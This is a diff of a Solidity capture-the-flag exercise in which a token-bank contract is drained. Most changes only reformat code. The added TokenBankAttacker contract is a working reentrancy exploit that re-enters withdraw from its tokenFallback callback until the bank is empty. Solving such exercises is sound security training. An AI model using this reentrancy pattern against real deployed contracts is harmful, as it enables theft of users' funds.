@@ -2,11 +2,7 @@
 pragma solidity ^0.8.13;
 
 interface ITokenReceiver {
-    function tokenFallback(
-        address from,
-        uint256 value,
-        bytes memory data
-    ) external;
+    function tokenFallback(address from, uint256 value, bytes memory data) external;
 }
 
 contract SimpleERC223Token {
@@ -40,12 +36,8 @@ contract SimpleERC223Token {
         return transfer(to, value, empty);
     }
 
-    function transfer(
-        address to,
-        uint256 value,
-        bytes memory data
-    ) public returns (bool) {
-        require(balanceOf[msg.sender] >= value);
+    function transfer(address to, uint256 value, bytes memory data) public returns (bool) {
+        require(balanceOf[msg.sender] >= value, "not enough funds");
 
         balanceOf[msg.sender] -= value;
         balanceOf[to] += value;
@@ -57,28 +49,17 @@ contract SimpleERC223Token {
         return true;
     }
 
-    event Approval(
-        address indexed owner,
-        address indexed spender,
-        uint256 value
-    );
+    event Approval(address indexed owner, address indexed spender, uint256 value);
 
     mapping(address => mapping(address => uint256)) public allowance;
 
-    function approve(
-        address spender,
-        uint256 value
-    ) public returns (bool success) {
+    function approve(address spender, uint256 value) public returns (bool success) {
         allowance[msg.sender][spender] = value;
         emit Approval(msg.sender, spender, value);
         return true;
     }
 
-    function transferFrom(
-        address from,
-        address to,
-        uint256 value
-    ) public returns (bool success) {
+    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
         require(value <= balanceOf[from]);
         require(value <= allowance[from][msg.sender]);
 
@@ -108,11 +89,7 @@ contract TokenBankChallenge {
         return token.balanceOf(address(this)) == 0;
     }
 
-    function tokenFallback(
-        address from,
-        uint256 value,
-        bytes memory data
-    ) public {
+    function tokenFallback(address from, uint256 value, bytes memory data) public {
         require(msg.sender == address(token));
         require(balanceOf[from] + value >= balanceOf[from]);
 
@@ -132,9 +109,26 @@ contract TokenBankChallenge {
 // Write your exploit contract below
 contract TokenBankAttacker {
     TokenBankChallenge public challenge;
+    SimpleERC223Token public token;
 
-    constructor(address challengeAddress) {
+    event Fallback(address from, uint256 value, bytes data);
+    event Balance(uint256 balance);
+
+    constructor() {}
+    function initialize(address challengeAddress) public {
         challenge = TokenBankChallenge(challengeAddress);
+        token = challenge.token();
     }
     // Write your exploit functions here
+    function exploit() public {
+        uint256 balanceOfAttacker = challenge.balanceOf(address(this));
+        emit Balance(balanceOfAttacker);
+        challenge.withdraw(500000 * 10 ** 18);
+    }
+    function tokenFallback(address from, uint256 value, bytes memory data) public {
+        emit Fallback(from, value, data);
+        if (!challenge.isComplete()) {
+            challenge.withdraw(value);
+        }
+    }
 }
